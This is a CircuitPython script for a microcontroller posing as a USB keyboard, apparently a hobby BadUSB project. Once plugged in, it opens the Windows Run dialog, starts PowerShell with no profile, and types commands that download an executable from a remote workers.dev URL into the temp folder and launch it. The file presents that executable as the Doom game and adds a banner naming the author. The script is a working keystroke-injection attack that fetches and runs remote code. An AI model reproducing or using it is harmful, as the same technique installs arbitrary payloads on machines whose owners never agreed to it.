# ---------------------------------------------------------
# AUTHOR: Flavio Donnini
# REPO: https://github.com/FlAvI0o
# PROJECT: Cloudflare Edge Direct Binary Downloader
# ---------------------------------------------------------
import time
import board
import digitalio
import usb_hid
import sys
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# 1. HARDWARE SWITCH
switch = digitalio.DigitalInOut(board.GP0)
switch.direction = digitalio.Direction.INPUT
switch.pull = digitalio.Pull.UP

if not switch.value:
    print("[*] Safe Mode: Graffetta rilevata. Esecuzione HID annullata.")
    sys.exit()

# 2. HID SETUP
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
time.sleep(4.0)

# 3. BREACH
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)

layout.write("powershell -nop")
time.sleep(1.0)
kbd.send(Keycode.ENTER)
time.sleep(3.0)

# 4. PAYLOAD BINARIO PURO (Zero conversioni di testo, zero bug di caratteri)
payload = [
    # Usiamo il WebClient nativo per scaricare il file binario direttamente sul PC
    '$wc = New-Object System.Net.WebClient',
    '$url = "https://doomdeploy.flaviodonnini07.workers.dev/"',
    '$exePath = "$env:TEMP\\chocolate-doom.exe"',
    '$wc.DownloadFile($url, $exePath)',
    
    # Interfaccia Visiva
    'Clear-Host',
    'Write-Host "------------------------------------------------" -ForegroundColor White',
    'Write-Host "  SYSTEM ACTIVATED BY: Flavio Donnini" -ForegroundColor Green',
    'Write-Host "  PORTFOLIO: https://github.com/FlAvI0o" -ForegroundColor Cyan',
    'Write-Host "------------------------------------------------" -ForegroundColor White',
    'Write-Host "[!] LAUNCHING CHOCOLATE DOOM..." -ForegroundColor Red',
    
    # Avvio del gioco funzionante
    'Start-Process -FilePath $exePath'
]

# 5. ESECUZIONE LINEARE
for line in payload:
    if line.strip():  
        layout.write(line)
        time.sleep(0.2)
    
    kbd.send(Keycode.ENTER)
    time.sleep(0.6)